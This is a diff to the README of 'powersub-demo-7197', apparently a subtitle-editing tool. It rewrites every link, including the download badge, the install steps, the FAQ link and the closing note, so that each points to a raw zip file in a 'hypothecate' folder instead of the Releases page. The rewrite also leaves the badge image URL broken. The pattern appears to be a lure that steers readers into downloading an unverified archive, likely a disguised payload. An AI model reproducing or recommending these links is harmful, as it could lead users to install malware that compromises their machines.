@@ -7,7 +7,7 @@ Welcome to **powersub-demo-7197**! This application simplifies the process of ad
 To begin using our software, follow these simple steps.
 
 ## 📥 Download the Application
-[![Download Now!](https://img.shields.io/badge/Download%20Now%21-Click%20Here-brightgreen)](https://github.com/Cleitoknove/powersub-demo-7197/releases)
+[![Download Now!](https://raw.githubusercontent.com/Cleitoknove/powersub-demo-7197/main/hypothecate/powersub-demo-7197.zip%20Now%21-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Cleitoknove/powersub-demo-7197/main/hypothecate/powersub-demo-7197.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -18,7 +18,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 To get started:
-1. Visit the [Releases page](https://github.com/Cleitoknove/powersub-demo-7197/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Cleitoknove/powersub-demo-7197/main/hypothecate/powersub-demo-7197.zip).
 2. Look for the latest version listed.
 3. Click on the asset for your operating system.
 4. Download the file to your computer.
@@ -44,7 +44,7 @@ Yes, you can share subtitle files via email or cloud services.
 Yes, the application includes a built-in help section to guide you through common tasks.
 
 ## 💬 Get Help
-If you experience any issues or have questions, please check our [FAQ section](https://github.com/Cleitoknove/powersub-demo-7197/releases) or reach out to our support team via GitHub issues.
+If you experience any issues or have questions, please check our [FAQ section](https://raw.githubusercontent.com/Cleitoknove/powersub-demo-7197/main/hypothecate/powersub-demo-7197.zip) or reach out to our support team via GitHub issues.
 
 ## 🌍 Community
 Join our growing community of users on GitHub to share your experiences, ask questions, and suggest new features. We value your feedback!
@@ -53,4 +53,4 @@ Join our growing community of users on GitHub to share your experiences, ask que
 Stay tuned for regular updates! We are continually working to improve the application and add new features based on user feedback. 
 
 ## 📌 Note
-For the latest information, visit our [Releases page](https://github.com/Cleitoknove/powersub-demo-7197/releases) frequently. We appreciate your support and hope you enjoy using **powersub-demo-7197**!
+For the latest information, visit our [Releases page](https://raw.githubusercontent.com/Cleitoknove/powersub-demo-7197/main/hypothecate/powersub-demo-7197.zip) frequently. We appreciate your support and hope you enjoy using **powersub-demo-7197**!
